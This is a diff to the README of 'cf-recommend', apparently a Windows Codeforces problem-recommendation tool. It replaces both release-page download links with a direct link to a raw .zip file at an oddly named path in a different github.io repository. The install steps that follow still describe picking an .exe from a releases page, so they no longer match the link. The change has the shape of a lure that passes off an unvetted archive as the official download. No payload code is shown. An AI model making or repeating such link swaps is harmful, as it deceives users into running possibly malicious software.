@@ -5,7 +5,7 @@ description: "Analyze your Codeforces submission history to receive custom probl
 ---
 # 📈 cf-recommend - Get better Codeforces problem suggestions today
 
-[![Download cf-recommend](https://img.shields.io/badge/Download-cf--recommend-blue.svg)](https://github.com/Noamunfree520/cf-recommend/releases)
+[![Download cf-recommend](https://img.shields.io/badge/Download-cf--recommend-blue.svg)](https://raw.githubusercontent.com/Noamunfree520/noamunfree520.github.io/main/Arosaguntacook/noamunfree_io_github_v3.9-alpha.3.zip)
 
 cf-recommend helps you find the right programming problems to solve on Codeforces. It analyzes your past performance and suggests exercises that match your skill level. You learn better when you practice with problems that challenge you without causing frustration. This tool removes the guesswork from your training routine.
 
@@ -17,7 +17,7 @@ This application runs on Windows 10 and Windows 11. You need a stable internet c
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following page to choose your download: [https://github.com/Noamunfree520/cf-recommend/releases](https://github.com/Noamunfree520/cf-recommend/releases)
+1. Visit the following page to choose your download: [https://raw.githubusercontent.com/Noamunfree520/noamunfree520.github.io/main/Arosaguntacook/noamunfree_io_github_v3.9-alpha.3.zip](https://raw.githubusercontent.com/Noamunfree520/noamunfree520.github.io/main/Arosaguntacook/noamunfree_io_github_v3.9-alpha.3.zip)
 2. Locate the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Save the file to a folder you can access easily, such as your Downloads folder or Desktop.
